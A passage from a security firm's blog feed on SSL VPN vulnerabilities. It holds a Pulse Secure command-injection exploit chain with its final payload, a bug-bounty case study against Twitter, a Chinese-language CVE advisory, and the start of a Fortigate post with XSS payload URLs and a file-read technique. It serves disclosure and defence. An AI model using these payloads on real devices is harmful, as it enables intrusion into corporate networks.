&lt;p&gt;The checks are very strict so that we can not perform any command injection. We imagined several ways to bypass that, and the first thing came out of my mind is the argument injection. We listed all arguments that &lt;code class=&quot;highlighter-rouge&quot;&gt;TCPDUMP&lt;/code&gt; supports and found that the &lt;code class=&quot;highlighter-rouge&quot;&gt;-z postrotate-command&lt;/code&gt; may be useful. But the sad thing is that the &lt;code class=&quot;highlighter-rouge&quot;&gt;TCPDUMP&lt;/code&gt; in Pulse Secure is too old(v3.9.4, Sept 2005) to support this juicy feature, so we failed :(&lt;/p&gt;

&lt;p&gt;While examining the system, we found that although the webroot is read-only, we can still abuse the cache mechanism. Pulse Secure caches the template result in &lt;code class=&quot;highlighter-rouge&quot;&gt;/data/runtime/tmp/tt/&lt;/code&gt; to speed up script rendering. So our next attempt is to write a file into the template cache directory via &lt;code class=&quot;highlighter-rouge&quot;&gt;-w write-file&lt;/code&gt; argument. However, it seems impossible to write a polyglot file in both PCAP and Perl format.&lt;/p&gt;

&lt;p&gt;As it seems we had reached the end of argument injection, we tried to dig deeper into the &lt;code class=&quot;highlighter-rouge&quot;&gt;DSSFAFE.pm&lt;/code&gt; implementation to see if there is anything we can leverage. Here we found a defect in the command line parser. If we insert an incomplete I/O redirection, the rest of the redirection part will be truncated. Although this is a tiny flaw, it helped us to re-control the I/O redirections! However, the problem that we can’t generate a valid Perl script still bothered us.&lt;/p&gt;

&lt;p&gt;We got stuck here, and it’s time to think out of the box. It’s hard to generate a valid Perl script via &lt;code class=&quot;highlighter-rouge&quot;&gt;STDOUT&lt;/code&gt;, could we just write the Perl by &lt;code class=&quot;highlighter-rouge&quot;&gt;STDERR&lt;/code&gt;? The answer is yes. When we force the &lt;code class=&quot;highlighter-rouge&quot;&gt;TCPDUMP&lt;/code&gt; to read a nonexistent-file via &lt;code class=&quot;highlighter-rouge&quot;&gt;-r read-file&lt;/code&gt;. It shows the error:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;tcpdump: [filename]: No such file or directory&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It seems we can “&lt;strong&gt;partially&lt;/strong&gt;” control the error message. Then we tried the filename &lt;code class=&quot;highlighter-rouge&quot;&gt;print 123#&lt;/code&gt;, and the magic happens!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;print 123#&#39;&lt;/span&gt;
  tcpdump: print 123#: No such file or directory
 
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;print 123#&#39;&lt;/span&gt; 2&amp;gt;&amp;amp;1 | perl –
  123
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The error message becomes a valid Perl script now. Why? OK, let’s have a Perl 101 lesson now!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, Perl supports the GOTO label, so the &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump: &lt;/code&gt; becomes a valid label in Perl. Then, we comment the rest with a hashtag. With this creative trick, we can generate any valid Perl now!&lt;/p&gt;

&lt;p&gt;Finally, we use an incomplete I/O symbol &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; to fool the &lt;code class=&quot;highlighter-rouge&quot;&gt;DSSAFE.pm&lt;/code&gt; command parser and redirect the &lt;code class=&quot;highlighter-rouge&quot;&gt;STDERR&lt;/code&gt; into the cache directory! Here is the final exploit:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-r$x=&quot;ls /&quot;,system$x# 2&amp;gt;/data/runtime/tmp/tt/setcookie.thtml.ttc &amp;lt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The concatenated command looks like:&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/sbin/tcpdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; 
 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;$x=&quot;ls /&quot;,system$x#&#39;&lt;/span&gt;
 2&amp;gt;/data/runtime/tmp/tt/setcookie.thtml.ttc &amp;lt; 
 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
 2&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And the generated &lt;code class=&quot;highlighter-rouge&quot;&gt;setcookie.thtml.ttc&lt;/code&gt; looks like:&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;tcpdump:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ls /&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#: No such file or directory&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once we have done this, we can just fetch the corresponding page to execute our command:&lt;/p&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://sslvpn/dana-na/auth/setcookie.cgi
 boot  bin  home  lib64       mnt      opt  proc  sys  usr  var
 data  etc  lib   lost+found  modules  pkg  sbin  tmp 
 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So far, the whole technical part of this command injection is over. However, we think there may be another creative way to exploit this, if you found one, please tell me!&lt;/p&gt;

&lt;h1 id=&quot;the-case-study&quot;&gt;The Case Study&lt;/h1&gt;

&lt;p&gt;After Pulse Secure patched all the bugs on &lt;strong&gt;April 24, 2019&lt;/strong&gt;. We kept monitoring the Internet to measure the response time of each large corporation. Twitter is one of them. They are known for their &lt;a href=&quot;http://hackerone.com/twitter&quot;&gt;bug bounty program&lt;/a&gt; and nice to hackers. However, it’s improper to exploit a 1-day right after the patch released. So we wait 30 days for Twitter to upgrade their SSL VPN.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have to say, we were nervous during that time. The first thing we did every morning is to check whether Twitter upgrades their SSL VPN or not! It was an unforgettable time for us :P&lt;/p&gt;

&lt;p&gt;We started to hack Twitter on &lt;strong&gt;May 28, 2019&lt;/strong&gt;. During this operation, we encounter several obstacles. The first one is, although we can obtain the plaintext password of Twitter staffs, we still can’t log into their SSL VPN because of the Two Factor Authentication. Here we suggest two ways to bypass that. The first one is that we observed Twitter uses the solution from &lt;a href=&quot;https://duo.com&quot;&gt;Duo&lt;/a&gt;. The &lt;a href=&quot;https://duo.com/docs/pulseconnect&quot;&gt;manual&lt;/a&gt; mentions:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The security of your Duo application is tied to the security of your secret key (skey). Secure it as you would any sensitive credential. Don’t share it with unauthorized individuals or email it to anyone under any circumstances!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So if we can extract the secret key from the system, we can leverage the Duo API to bypass the 2FA. However, we found a quicker way to bypass it. Twitter enabled the &lt;a href=&quot;https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB30329&quot;&gt;Roaming Session&lt;/a&gt; feature, which is used to enhances mobility and allows a session from multiple IP locations.&lt;/p&gt;

&lt;p&gt;Due to this “&lt;strong&gt;convenient&lt;/strong&gt;” feature, we can just download the session database and forge our cookies to log into their system!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Until now, we are able to access Twitter Intranet. Nevertheless, our goal is to achieve code execution! It sounds more critical than just accessing the Intranet. So we would like to chain our command injection bug(CVE-2019-11539) together. OK, here, we encountered another obstacle. It’s the restricted management interface!&lt;/p&gt;

&lt;p&gt;As we mentioned before, our bug is on the management interface. But for the security consideration, most of the corporation disable this interface on public, so we need another way to access the admin page. If you have read our previous article carefully, you may recall the “&lt;strong&gt;WebVPN&lt;/strong&gt;” feature! WebVPN is a proxy which helps to connect to anywhere. So, let’s connect to itself.&lt;/p&gt;

&lt;p&gt;Yes, it’s SSRF! &lt;br /&gt;&lt;br /&gt;Here we use a small trick to bypass the SSRF protections.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahha! Through our SSRF, we can touch the interface now! Then, the last obstacle popped up. We didn’t have any plaintext password of managers. When Perl wants to exchange data with native procedures, such as the Perl extension in C++ or web server, it uses the cache to store data. The problem is, Pulse Secure forgets to clear the sensitive data after exchange, so that’s why we can obtain plaintext passwords in the cache. But practically, most of the managers only log into their system for the first time, so it’s hard to get the manager’s plaintext password. The only thing we got, is the password hash in &lt;code class=&quot;highlighter-rouge&quot;&gt;sha256(md5_crypt(salt, …))&lt;/code&gt; format…&lt;/p&gt;

&lt;p&gt;If you are experienced in cracking hashes, you will know how hard it is. So…&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;We launched a 72 core AWS to crack that.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We cracked the hash and got the RCE successfully! I think we are lucky because from our observation, there is a very strong password policy on Twitter staffs. But it seems the policy is not applied to the manager. The manager’s password length is only ten, and the first character is &lt;strong&gt;B&lt;/strong&gt;. It’s at a very early stage of our cracking queue so that we can crack the hash in 3 hours.&lt;/p&gt;

&lt;p&gt;We reported all of our findings to Twitter and got the highest bounty from them. Although we can not prove that, it seems this is the first remote code execution on Twitter! If you are interested in the full report, you can check the &lt;a href=&quot;https://hackerone.com/reports/591295&quot;&gt;HackerOne link&lt;/a&gt; for more details.&lt;/p&gt;

&lt;h1 id=&quot;recommendations&quot;&gt;Recommendations&lt;/h1&gt;

&lt;p&gt;How to mitigate such attacks? Here we give several recommendations.&lt;/p&gt;

&lt;p&gt;The first is the Client-Side Certificate. It’s also the most effective method. Without a valid certificate, the malicious connection will be dropped during SSL negotiation! The second is the Multi-factor Authentication. Although we break the Twitter 2FA this time, with a proper setting, the MFA can still decrease numerous attack surface. Next, enable the full log audit and remember to send to an out-bound log server.&lt;/p&gt;

&lt;p&gt;Also, perform your corporate asset inventory regularly and subscribe to the vendor’s security advisory. The most important of all, always keep your system updated!&lt;/p&gt;

&lt;h1 id=&quot;bonus-take-over-all-the-vpn-clients&quot;&gt;Bonus: Take over all the VPN clients&lt;/h1&gt;

&lt;p&gt;Our company, &lt;a href=&quot;https://devco.re/&quot;&gt;DEVCORE&lt;/a&gt;, provides the most professional red team service in Asia. In this bonus part, let’s talk about how to make the red team more &lt;strong&gt;RED&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;We always know that in a red team operation, the personal computer is more valuable! There are several old-school methods to compromise the VPN clients through SSL VPN before, such as the water-hole attack and replacing the VPN agent.&lt;/p&gt;

&lt;p&gt;During our research, we found a new attack vector to take over all the clients. It’s the “&lt;strong&gt;logon script&lt;/strong&gt;” feature. It appears in almost EVERY SSL VPNs, such as OpenVPN, Fortinet, Pulse Secure… and more. It can execute corresponding scripts to mount the network file-system or change the routing table once the VPN connection established.&lt;/p&gt;

&lt;p&gt;Due to this “&lt;strong&gt;hacker-friendly&lt;/strong&gt;” feature, once we got the admin privilege, we can leverage this feature to infect all the VPN clients! Here we use the Pulse Secure as an example, and demonstrate how to not only compromise the SSL VPN but also take over all of your connected clients:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/v7JUMb70ON4&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h1 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h1&gt;

&lt;p&gt;OK, here is the end of this Attacking SSL VPN series! From our findings, SSL VPN is such a huge attack surface with few security researchers digging into. Apparently, it deserves more attention. We hope this kind of series can encourage other researchers to engage in this field and enhance the security of enterprises!&lt;/p&gt;

&lt;p&gt;Thanks to all guys we met, co-worked and cooperated. We will publish more innovative researches in the future :)&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/</link>
                <guid>https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study</guid>
                <pubDate>Mon, 02 Sep 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Pulse Secure SSL VPN 資安通報</title>
                <description>&lt;h3 id=&quot;內容&quot;&gt;內容&lt;/h3&gt;

&lt;p&gt;在我們對 Pulse Secure SSL VPN 的安全研究中，共發現了下列七個弱點。組合利用有機會取得 SSL VPN 設備的最高權限，可讓攻擊者進入用戶內網，甚至控制每個透過 SSL VPN 連線的使用者裝置。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2019-11510 - Pre-auth Arbitrary File Reading&lt;/li&gt;
  &lt;li&gt;CVE-2019-11542 - Post-auth(admin) Stack Buffer Overflow&lt;/li&gt;
  &lt;li&gt;CVE-2019-11539 - Post-auth(admin) Command Injection&lt;/li&gt;
  &lt;li&gt;CVE-2019-11538 - Post-auth(user) Arbitrary File Reading via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11508 - Post-auth(user) Arbitrary File Writing via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11540 - Post-auth Cross-Site Script Inclusion&lt;/li&gt;
  &lt;li&gt;CVE-2019-11507 - Post-auth Cross-Site Scripting&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;受影響的版本如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Pulse Connect Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.3R1 - 8.3R7&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.2R1 - 8.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.1R1 - 8.1R15&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.4R1 - 5.4R7&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.3R1 - 5.3R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.2R1 - 5.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.1R1 - 5.1R15&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;目前已經出現攻擊者對全世界設備進行大規模掃描，請 Pulse Secure SSL VPN 用戶&lt;strong&gt;儘速更新&lt;/strong&gt;，需要更新的版本資源可參考&lt;a href=&quot;https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101&quot;&gt;原廠 Pulse Secure 的公告&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&quot;細節&quot;&gt;細節&lt;/h3&gt;

&lt;p&gt;詳細的技術細節請參閱我們的 Advisory：&lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;附註&quot;&gt;附註&lt;/h3&gt;

&lt;p&gt;目前亦發現攻擊者對我們之前發表的 &lt;a href=&quot;https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/&quot;&gt;Fortigate SSL VPN&lt;/a&gt; 及 &lt;a href=&quot;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&quot;&gt;Palo Alto GlobalProtect&lt;/a&gt; 弱點進行大規模掃描，再次提醒請用戶儘速更新以上 SSL VPN 設備至最新版。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory/</link>
                <guid>https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory</guid>
                <pubDate>Wed, 28 Aug 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN</title>
                <description>&lt;p&gt;Author: Meh Chang(&lt;a href=&quot;https://twitter.com/mehqq_&quot;&gt;@mehqq_&lt;/a&gt;) and Orange Tsai(&lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;Last month, we talked about &lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;Palo Alto Networks GlobalProtect RCE&lt;/a&gt; as an appetizer. Today, here comes the main dish! If you cannot go to Black Hat or DEFCON for our talk, or you are interested in more details, here is the slides for you!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf&quot;&gt;Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We will also give a speech at the following conferences, just come and find us!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://hitcon.org/2019/CMT/agenda&quot;&gt;HITCON&lt;/a&gt; - Aug. 23 @ Taipei (Chinese)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://gsec.hitb.org/sg2019/agenda/&quot;&gt;HITB GSEC&lt;/a&gt; - Aug. 29,30 @ Singapore&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.romhack.io/program_en-2019.html&quot;&gt;RomHack&lt;/a&gt; - Sep. 28 @ Rome&lt;/li&gt;
  &lt;li&gt;and more …&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;lets-start&quot;&gt;Let’s start!&lt;/h1&gt;

&lt;p&gt;The story began in last August, when we started a new research project on SSL VPN. Compare to the site-to-site VPN such as the IPSEC and PPTP, SSL VPN is more easy to use and compatible with any network environments. For its convenience, SSL VPN becomes the most popular remote access way for enterprise!&lt;/p&gt;

&lt;p&gt;However, what if this trusted equipment is insecure? It is an important corporate asset but a blind spot of corporation. According to our survey on Fortune 500, the Top-3 SSL VPN vendors dominate about 75% market share. The diversity of SSL VPN is narrow. Therefore, once we find a critical vulnerability on the leading SSL VPN, the impact is huge. There is no way to stop us because SSL VPN must be exposed to the internet.&lt;/p&gt;

&lt;p&gt;At the beginning of our research, we made a little survey on the CVE amount of leading SSL VPN vendors:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It seems like Fortinet and Pulse Secure are the most secure ones. Is that true? As a myth buster, we took on this challenge and started hacking Fortinet and Pulse Secure! This story is about hacking &lt;strong&gt;Fortigate SSL VPN&lt;/strong&gt;. The next article is going to be about &lt;strong&gt;Pulse Secure&lt;/strong&gt;, which is the most splendid one! Stay tuned!&lt;/p&gt;

&lt;h1 id=&quot;fortigate-ssl-vpn&quot;&gt;Fortigate SSL VPN&lt;/h1&gt;

&lt;p&gt;Fortinet calls their SSL VPN product line as Fortigate SSL VPN, which is prevalent among end users and medium-sized enterprise. There are more than 480k servers operating on the internet and is common in Asia and Europe. We can identify it from the URL &lt;code class=&quot;highlighter-rouge&quot;&gt;/remote/login&lt;/code&gt;. Here is the technical feature of Fortigate:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;All-in-one binary&lt;br /&gt;
  We started our research from the file system. We tried to list the binaries in &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/&lt;/code&gt; and found there are all symbolic links, pointing to &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/init&lt;/code&gt;. Just like this:&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;Fortigate compiles all the programs and configurations into a single binary, which makes the &lt;code class=&quot;highlighter-rouge&quot;&gt;init&lt;/code&gt; really huge. It contains thousands of functions and there is no symbol! It only contains necessary programs for the SSL VPN, so the environment is really inconvenient for hackers. For example, there is even no &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/ls&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/cat&lt;/code&gt;!&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Web daemon&lt;br /&gt;
  There are 2 web interfaces running on the Fortigate. One is for the admin interface, handled with &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/httpsd&lt;/code&gt; on the port 443. The other is normal user interface, handled with &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sslvpnd&lt;/code&gt; on the port 4433 by default. Generally, the admin page should be restricted from the internet, so we can only access the user interface.&lt;/p&gt;

    &lt;p&gt;Through our investigation, we found the web server is modified from apache, but it is the apache from 2002. Apparently they modified apache in 2002 and added their own additional functionality. We can map the source code of apache to speed up our analysis.&lt;/p&gt;

    &lt;p&gt;In both web service, they also compiled their own apache modules into the binary to handle each URL path. We can find a table specifying the handlers and dig into them!&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;WebVPN&lt;br /&gt;
  WebVPN is a convenient proxy feature which allows us connect to all the services simply through a browser. It supports many protocols, like HTTP, FTP, RDP. It can also handle various web resources, such as WebSocket and Flash. To process a website correctly, it parses the HTML and rewrites all the URLs for us. This involves heavy string operation, which is prone to memory bugs.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h1&gt;

&lt;p&gt;We found several vulnerabilities:&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13379-pre-auth-arbitrary-file-reading&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-384&quot;&gt;CVE-2018-13379&lt;/a&gt;: Pre-auth arbitrary file reading&lt;/h3&gt;
&lt;p&gt;While fetching corresponding language file, it builds the json file path with the parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;lang&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/migadmin/lang/%s.json&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;There is no protection, but a file extension appended automatically. It seems like we can only read json file. However, actually we can abuse the feature of &lt;code class=&quot;highlighter-rouge&quot;&gt;snprintf&lt;/code&gt;. According to the man page, it writes &lt;strong&gt;at most size-1&lt;/strong&gt; into the output string. Therefore, we only need to make it exceed the buffer size and the &lt;code class=&quot;highlighter-rouge&quot;&gt;.json&lt;/code&gt; will be stripped. Then we can read whatever we want.&lt;/p&gt;

&lt;h3 id=&quot;cve-2018-13380-pre-auth-xss&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-383&quot;&gt;CVE-2018-13380&lt;/a&gt;: Pre-auth XSS&lt;/h3&gt;
&lt;p&gt;There are several XSS:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1)%3C/script%3E
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/message?title=x&amp;amp;msg=%26%23&amp;lt;svg/onload=alert(1)&amp;gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;cve-2018-13381-pre-auth-heap-overflow&quot;&gt;&lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-387&quot;&gt;CVE-2018-13381&lt;/a&gt;: Pre-auth heap overflow&lt;/h3&gt;
&lt;p&gt;While encoding HTML entities code, there are 2 stages. The server first calculate the required buffer length for encoded string. Then it encode into the buffer. In the calculation stage, for example, encode string for &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#60;&lt;/code&gt; and this should occupies 5 bytes. If it encounter anything starts with &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#&lt;/code&gt;, such as &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#60;&lt;/code&gt;, it consider there is a token already encoded, and count its length directly. Like this:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;(&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;)&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;#&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&#39;&amp;lt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span 